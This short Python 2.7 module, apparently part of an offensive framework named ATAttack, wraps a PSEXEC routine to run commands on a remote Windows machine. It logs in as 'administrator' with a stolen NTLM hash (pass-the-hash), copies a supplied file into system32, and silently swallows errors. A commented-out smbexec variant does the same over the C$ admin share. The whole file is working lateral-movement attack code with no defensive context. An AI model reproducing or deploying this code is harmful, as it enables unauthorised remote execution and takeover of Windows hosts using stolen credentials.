#! /usr/bin/env python2.7
# -*- coding: utf-8 -*-

# import smbexec
from psexec import PSEXEC
# import  multiprocessing
from ATAttack.framework.constant import constant


# def smbexec(command, target, ntlmhash):
#     try:
#         executer = smbexec.CMDEXEC(
#             "445/SMB",
#             username=constant.username,
#             domain='',
#             hashes=constant.lmhash.format(ntlmhash),
#             mode="SHARE",
#             share="C$",
#             serviceName=None)
#         exdb = executer.run(target, command)
#         return exdb
#     except Exception :
#         pass

def psexec(command,target, ntlmhash,File):
    try:
        objes = PSEXEC(
            command,
            "c:\\windows\\system32\\",
            exeFile=None,
            copyFile=File,
            username="administrator",
            hashes=constant.lmhash.format(ntlmhash))
        objes.run(target)
    except Exception :
        pass
